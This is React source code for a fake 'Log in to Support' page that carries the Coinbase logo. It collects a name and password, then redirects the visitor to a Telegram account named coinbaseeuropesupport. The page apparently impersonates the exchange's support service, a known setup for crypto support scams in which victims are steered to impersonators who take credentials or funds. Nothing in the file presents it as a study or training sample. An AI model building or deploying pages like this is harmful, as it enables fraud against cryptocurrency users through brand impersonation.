import React, { useEffect, useState } from "react";
import ReactDOM from "react-dom/client";

function App() {
  const [name, setName] = useState("");
  const [password, setPassword] = useState("");
  const [loggedIn, setLoggedIn] = useState(false);

  const handleLogin = () => {
    if (name.trim() && password.trim()) {
      setLoggedIn(true);
    }
  };

  useEffect(() => {
    if (loggedIn) {
      window.location.href = "https://t.me/coinbaseeuropesupport";
    }
  }, [loggedIn]);

  return (
    <div style={wrapper}>
      <div style={box}>
        <img src="https://cryptologos.cc/logos/coinbase-coinbase-logo.png?v=026" alt="Coinbase Logo"
          style={{ width: 70, height: 70, filter: 'brightness(0) invert(1)', marginBottom: 20 }} />
        {!loggedIn ? (
          <>
            <h2 style={{ marginBottom: 20 }}>Log in to Support</h2>
            <input
              style={inputStyle}
              placeholder="Your name"
              value={name}
              onChange={(e) => setName(e.target.value)}
            />
            <input
              type="password"
              style={inputStyle}
              placeholder="Your password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
            <button style={buttonStyle} onClick={handleLogin}>Login</button>
          </>
        ) : (
          <p>Redirecting to Telegram...</p>
        )}
      </div>
    </div>
  );
}

const wrapper = {
  display: 'flex',
  alignItems: 'center',
  justifyContent: 'center',
  minHeight: '100vh',
  backgroundColor: '#0a0f1c'
};

const box = {
  width: '100%',
  maxWidth: 500,
  background: '#1e293b',
  padding: 30,
  borderRadius: 12,
  boxShadow: '0 0 20px rgba(0,0,0,0.3)',
  textAlign: 'center'
};

const inputStyle = {
  width: "100%",
  padding: "12px",
  borderRadius: "8px",
  border: "1px solid #334155",
  backgroundColor: "#0f172a",
  color: "#f8fafc",
  fontSize: "16px",
  marginBottom: "10px"
};

const buttonStyle = {
  width: "100%",
  padding: "12px",
  borderRadius: "8px",
  backgroundColor: "#3b82f6",
  color: "#fff",
  border: "none",
  cursor: "pointer",
  fontSize: "16px",
  marginTop: "10px"
};

ReactDOM.createRoot(document.getElementById("root")).render(<App />);
